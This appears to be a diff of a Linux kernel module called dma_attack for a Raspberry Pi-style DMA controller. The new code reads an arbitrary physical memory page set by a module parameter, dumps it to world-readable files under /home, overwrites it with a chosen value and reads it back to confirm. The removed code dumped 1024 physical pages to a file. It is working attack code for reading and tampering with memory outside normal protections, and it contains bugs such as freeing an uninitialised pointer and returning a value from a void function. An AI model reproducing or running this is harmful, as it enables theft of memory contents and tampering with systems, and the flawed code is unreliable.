@@ -135,6 +135,68 @@ void writeBitmasked(volatile uint32_t * dest, uint32_t mask,
 	*dest = new;		//added safety for when crossing memory barriers.
 }
 
+void dma_enable(void* start, int dmaChNum)
+{
+	writeBitmasked(start + DMAENABLE / 4, 1 << dmaChNum, 1 << dmaChNum);
+	mdelay(1000);
+}
+void dma_tx(volatile struct DmaChannelHeader* dmaHeader, void* physSrcPage, void* physDstPage, uint32_t size)
+{
+	void* virtCbPage;
+	void* physCbPage;
+	volatile struct DmaControlBlock* cb1;
+
+	memset((void*)dmaHeader, 0, sizeof(struct DmaChannelHeader));
+	mdelay(500);
+
+	virtCbPage = (void*)__get_dma_pages(GFP_ATOMIC, 0);
+	memset(virtCbPage, 0, 4096);
+
+	if (virtCbPage == NULL) {
+		pr_err("Failed allocated physCbPage\n");
+		return -1;
+	}
+
+	physCbPage = (void *) virt_to_phys(virtCbPage);
+	memset(virtCbPage, 0, 4096);
+
+	//dedicate the first 8 words of this page to holding the cb.
+	cb1 = (struct DmaControlBlock *) virtCbPage;
+
+	//fill the control block:
+	cb1->TI = DMA_CB_TI_SRC_INC | DMA_CB_TI_DEST_INC | DMA_CB_TI_WAITS | DMA_CB_TI_WAIT_RESP;	//after each byte copied, we want to increment the source and destination address of the copy, otherwise we'll be copying to the same address.
+	cb1->SOURCE_AD = (uint32_t)physSrcPage;	//set source and destination DMA address
+	cb1->DEST_AD = (uint32_t)physDstPage;
+	cb1->TXFR_LEN = size;	//transfer 12 bytes
+	cb1->STRIDE = 0;	//no 2D stride
+	cb1->NEXTCONBK = 0;	//no next control block
+	printk("TI STATUS BEFORE: %x\n", cb1->TI);
+	mdelay(500);		//give time for the reset command to be handled.
+
+	// 0 -> Active
+	// 8 -> DREQ
+	// a -> END + DREQ
+	// 21 -> ACTIVE + INT + PAUSED
+	// printk("DMA phys HEADER ADDR: %llx\n", virt_to_phys(dmaHeader));
+
+	printk("DMA STATUS REGISTER (Before TX) %x\n", dmaHeader->CS);
+	dmaHeader->CS = DMA_CS_RESET;	//make sure to disable dma first.
+	mdelay(2000);		//give time for the reset command to be handled.
+	dmaHeader->DEBUG = DMA_DEBUG_READ_ERROR | DMA_DEBUG_FIFO_ERROR | DMA_DEBUG_READ_LAST_NOT_SET_ERROR;	// clear debug error flags
+	dmaHeader->CONBLK_AD = (uint32_t)physCbPage;	//we have to point it to the PHYSICAL address of the control block (cb1)
+
+	printk("DMA STATUS REGISTER (After CB Before Active) %x\n", dmaHeader->CS);
+	dmaHeader->CS = DMA_CS_ACTIVE;	//set active bit, but everything else is 0.
+	mdelay(9000);
+
+
+	printk("DMA STATUS REGISTER (AFTER Tx) %x\n", dmaHeader->CS);
+printk("TI STATUS AFTER: %x\n", cb1->TI);
+
+	free_pages((unsigned long)virtCbPage, 0);	
+
+}
+
 static void dma_attack_cleanup(void)
 {
 	printk("dma_attack exit\n");
@@ -142,17 +204,28 @@ static void dma_attack_cleanup(void)
 
 // static phys_addr_t dma_start = 0x3f007000L;
 //static int  dma_offset= ;
+static int addr = 0;
+module_param(addr,int,0660);
+
+static int data = 0;
+module_param(data,int,0660);
+
 static int __init dma_attack_init(void)
 {
 	volatile void *start;
 	struct file* F;
-	void *virtCbPage;
+		struct file* F1;
+	struct file* F2;
+
 	void *physCbPage;
 	char *virtSrcPage;
 	void *physSrcPage;
 	char *virtDstPage;
 	void *physDstPage;
-	struct DmaControlBlock *cb1;
+	void* physCopyPage;
+	void* virtCopyPage;
+	void* physNewDstPage;
+	void* virtNewDstPage;
 	char datafile[40];
 	volatile struct DmaChannelHeader *dmaHeader;
 
@@ -165,83 +238,91 @@ static int __init dma_attack_init(void)
 
 	start = (void*) ioremap_nocache(dma_start, 4096);
 
-	for (i = 0; i < 1024; i++)
-	{
-		printk("Working for page: %d\n", i);
-		virtSrcPage = i * 4096;
-
-		virtCbPage = (void*)__get_dma_pages(GFP_ATOMIC, 0);
-		memset(virtCbPage, 0, 4096);
-		// virtCbPage = get_zeroed_page(GFP_KERNEL | GFP_DMA);
-		if (virtCbPage == NULL) {
-			pr_err("Failed allocated physCbPage\n");
-			return -1;
-		}
-		// virtCbPage = (void*)phys_to_virt(physCbPage);
-		physCbPage = (void *) virt_to_phys(virtCbPage);
-
-		virtDstPage = (char*)__get_dma_pages(GFP_ATOMIC, 0);
-		
-		if (virtDstPage == NULL) {
-			pr_err("Failed allocated virtDstPage\n");
-			return -1;
-		}
-
-		memset(virtDstPage, 0, 4096);
-
-		physDstPage = (void *) virt_to_phys(virtDstPage);
-
-		//dedicate the first 8 words of this page to holding the cb.
-		cb1 = (struct DmaControlBlock *) virtCbPage;
-
-		// printk("phys src page: %p\n", virtSrcPage);
-		// printk("phys dst page: %p\n", physDstPage);
-		printk("phys src page: %x\n", (uint32_t)virtSrcPage);
-		// printk("phys dst page: %x\n", (uint32_t)physDstPage);
-
-		//fill the control block:
-		cb1->TI = DMA_CB_TI_SRC_INC | DMA_CB_TI_DEST_INC | DMA_CB_TI_WAITS | DMA_CB_TI_WAIT_RESP;	//after each byte copied, we want to increment the source and destination address of the copy, otherwise we'll be copying to the same address.
-		cb1->SOURCE_AD = (uint32_t)virtSrcPage;	//set source and destination DMA address
-		cb1->DEST_AD = (uint32_t)physDstPage;
-		cb1->TXFR_LEN = 4096;	//transfer 12 bytes
-		cb1->STRIDE = 0;	//no 2D stride
-		cb1->NEXTCONBK = 0;	//no next control block
-
-		mdelay(500);
-		writeBitmasked(start + DMAENABLE / 4, 1 << dmaChNum, 1 << dmaChNum);
-		mdelay(500);
-		dmaHeader = (volatile struct DmaChannelHeader *) (start + (DMACH(dmaChNum)) / 4);
-		memset((void*)dmaHeader, 0, sizeof(struct DmaChannelHeader));
-
-
-		// 0 -> Active
-		// 8 -> DREQ
-		// a -> END + DREQ
-		// 21 -> ACTIVE + INT + PAUSED
-		// printk("DMA phys HEADER ADDR: %llx\n", virt_to_phys(dmaHeader));
-
-		printk("DMA STATUS REGISTER (Before TX) %x\n", dmaHeader->CS);
-		// printk("Control block physical address: %p\n", physCbPage);
-		// printk("Control block physical address casted: %u\n", (uint32_t)physCbPage);
-		dmaHeader->CS = DMA_CS_RESET;	//make sure to disable dma first.
-		mdelay(2000);		//give time for the reset command to be handled.
-		dmaHeader->DEBUG = DMA_DEBUG_READ_ERROR | DMA_DEBUG_FIFO_ERROR | DMA_DEBUG_READ_LAST_NOT_SET_ERROR;	// clear debug error flags
-		dmaHeader->CONBLK_AD = (uint32_t)physCbPage;	//we have to point it to the PHYSICAL address of the control block (cb1)
-		printk("DMA STATUS REGISTER (After CB Before Active) %x\n", dmaHeader->CS);
-		dmaHeader->CS = DMA_CS_ACTIVE;	//set active bit, but everything else is 0.
-		mdelay(5000);
-		printk("DMA STATUS REGISTER (AFTER Tx) %x\n", dmaHeader->CS);
-
-
-		virtDstPage = (char*)phys_to_virt((phys_addr_t)physDstPage);
-
-		F = file_open("/home/all_pages.blob",  O_CREAT |  O_RDWR | O_APPEND, S_IRWXU | S_IRWXG | S_IRWXO);
-		file_write(F, i * 4096, (char*)virtDstPage, 4096);
-		file_sync(F); 
-
-		free_pages((unsigned long)virtCbPage, 0);
-		free_pages((unsigned long)virtDstPage, 0);
+	virtDstPage = (char*)__get_dma_pages(GFP_ATOMIC, 0);
+	
+	if (virtDstPage == NULL) {
+		pr_err("Failed allocated virtDstPage\n");
+		return -1;
 	}
+
+	memset(virtDstPage, 0, 4096);
+
+	physDstPage = (void *) virt_to_phys(virtDstPage);
+
+	// printk("phys src page: %p\n", virtSrcPage);
+	// printk("phys dst page: %p\n", physDstPage);
+	physSrcPage = (void*)addr;
+
+	printk("copy from: %x to %x\n", (uint32_t)physSrcPage, (uint32_t)physDstPage);
+	dma_enable(start, dmaChNum);
+
+	// Set the dma header
+	dmaHeader = (volatile struct DmaChannelHeader *) (start + (DMACH(dmaChNum)) / 4);
+
+	dma_tx(dmaHeader, physSrcPage, physDstPage, 4096);
+	// printk("Read from %x the data: %x\n", physDstPage, *(uint32_t*)virtDstPage);
+
+	F = file_open("/home/FirstPage.blob",  O_CREAT |  O_RDWR | O_APPEND, S_IRWXU | S_IRWXG | S_IRWXO);
+	file_write(F, 0, (char*)virtDstPage, 4096);
+	file_sync(F); 
+	file_close(F);
+
+
+	printk("Overriding data with %x\n", data);
+	// memset(virtDstPage, 0, 4096);
+
+	// virtCopyPage = (char*)__get_dma_pages(GFP_ATOMIC, 0);
+	
+	// if (virtCopyPage == NULL) {
+	// 	pr_err("Failed allocated virtDstPage\n");
+	// 	return -1;
+	// }
+
+	// memset(virtCopyPage, 0, 4096);
+
+	// physCopyPage = virt_to_phys(virtCopyPage);
+
+	// *((uint32_t*)virtCopyPage) = data;
+	// // Copy the data to the addr
+	*((uint32_t*)virtDstPage) = data;
+	mdelay(2000);
+	F1 = file_open("/home/PageToWrite.blob",  O_CREAT |  O_RDWR | O_APPEND, S_IRWXU | S_IRWXG | S_IRWXO);
+	file_write(F1, 0, (char*)virtDstPage, 4096);
+	file_sync(F1); 
+	file_close(F1);
+	dma_tx(dmaHeader, physDstPage, physSrcPage, 4096);
+	mdelay(2000);
+	// Check if the data really changed
+	memset(virtDstPage, 0, 4096);
+	mdelay(2000);
+
+
+
+	physSrcPage = (void*)addr;
+
+	virtNewDstPage = (char*)__get_dma_pages(GFP_ATOMIC, 0);
+	
+	if (virtDstPage == NULL) {
+		pr_err("Failed allocated virtDstPage\n");
+		return -1;
+	}
+
+	memset(virtNewDstPage, 0, 4096);
+
+	physNewDstPage = virt_to_phys(virtNewDstPage);
+
+	dma_tx(dmaHeader, physSrcPage, physNewDstPage, 4096);
+	// printk("Read from %x the data: %x\n", physDstPage, (uint32_t*)virtDstPage[0]);
+	mdelay(5000);
+	F2 = file_open("/home/OverridenPage.blob",  O_CREAT |  O_RDWR | O_APPEND, S_IRWXU | S_IRWXG | S_IRWXO);
+	file_write(F2, 0, (char*)virtNewDstPage, 4096);
+	file_sync(F2); 
+	file_close(F2);
+
+	free_pages((unsigned long)virtDstPage, 0);
+	free_pages((unsigned long)virtNewDstPage, 0);
+	free_pages((unsigned long)virtCopyPage, 0);
+
 
 	// free_pages((unsigned long)virtSrcPage, 0);
 	
